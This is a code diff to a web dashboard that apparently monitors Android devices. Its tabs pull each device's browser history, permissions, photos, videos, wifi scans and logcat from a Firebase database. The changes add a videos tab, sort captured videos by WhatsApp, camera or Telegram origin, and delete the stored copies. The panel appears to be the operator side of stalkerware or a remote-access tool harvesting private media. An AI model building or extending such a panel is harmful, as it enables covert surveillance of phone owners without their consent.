@@ -1072,6 +1072,7 @@ if (btn.dataset.tab === 'playback') {
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
     if (btn.dataset.tab === 'photos') pollPhotos();
+    if (btn.dataset.tab === 'videos') pollVideos();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
     if (btn.dataset.tab === 'health') pollHealth();
@@ -2380,7 +2381,7 @@ async function pollVideos() {
     return;
   }
   
-  const videoIds = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+  const videoIds = Object.keys(keys).filter(k => /^\d+$/.test(k)).sort((a, b) => parseInt(b) - parseInt(a));
   grid.innerHTML = '<div class="label">Loading videos...</div>';
   
   const allVideos = [];
@@ -2419,13 +2420,13 @@ async function pollVideos() {
     const data = v.data || '';
     const thumb = v.thumb || '';
     
-    // Determine source for filter
+    const safeFileName = fileName || 'Unknown';
     let source = 'other';
-    if (fileName.toLowerCase().includes('whatsapp')) source = 'whatsapp';
-    else if (fileName.toLowerCase().includes('camera') || fileName.toLowerCase().includes('dcim') || fileName.toLowerCase().startsWith('vid_')) source = 'camera';
-    else if (fileName.toLowerCase().includes('telegram')) source = 'telegram';
+    if (safeFileName.toLowerCase().includes('whatsapp')) source = 'whatsapp';
+    else if (safeFileName.toLowerCase().includes('camera') || safeFileName.toLowerCase().includes('dcim') || safeFileName.toLowerCase().startsWith('vid_')) source = 'camera';
+    else if (safeFileName.toLowerCase().includes('telegram')) source = 'telegram';
     
-    html += `<div class="pwrap" data-source="${source}" data-video-id="${videoId}" data-base64="${data}" data-mime="${mimeType}" data-filename="${fileName.replace(/"/g,'&quot;')}" style="aspect-ratio:16/9;cursor:pointer">
+    html += `<div class="pwrap" data-source="${source || 'other'}" data-video-id="${videoId}" data-base64="${data}" data-mime="${mimeType || 'video/mp4'}" data-filename="${(fileName || 'Unknown').replace(/"/g,'&quot;')}" style="aspect-ratio:16/9;cursor:pointer">
       ${thumb ? `<img src="data:image/jpeg;base64,${thumb}" loading="lazy" alt="${fileName}" style="width:100%;height:100%;object-fit:cover">` : 
         `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--muted);font-size:28px">&#x1F3AC;</div>`}
       <div class="pcap">
@@ -2524,8 +2525,15 @@ async function deleteVideo(videoId) {
   if (!confirm('Delete this video from RTDB?')) return;
   try {
     await deleteRTDB(`devices/${selectedDevice}/videos/${videoId}`);
+    try {
+      const storagePath = `videos/${selectedDevice}/${videoId}`;
+      await deleteStorageFile(storagePath);
+    } catch (se) {
+      console.warn('Storage delete optional:', se.message);
+    }
     showAlert('Video deleted', 'warn');
     pollVideos();
+    await refreshStorage();
   } catch (e) {
     showAlert('Delete failed: ' + e.message, 'error');
   }
